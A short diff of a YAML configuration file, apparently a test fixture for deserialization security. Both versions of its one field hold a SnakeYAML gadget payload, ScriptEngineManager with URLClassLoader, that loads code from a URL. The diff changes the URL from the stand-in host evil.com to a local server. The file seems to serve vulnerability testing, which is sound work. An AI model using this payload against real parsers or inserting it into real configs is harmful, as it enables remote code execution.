@@ -1,2 +1,2 @@
 !!FuzzySearchConfig
-algorithm: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ "http://evil.com" ] ] ]]
+algorithm: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ "http://127.0.0.1:8000" ] ] ]]
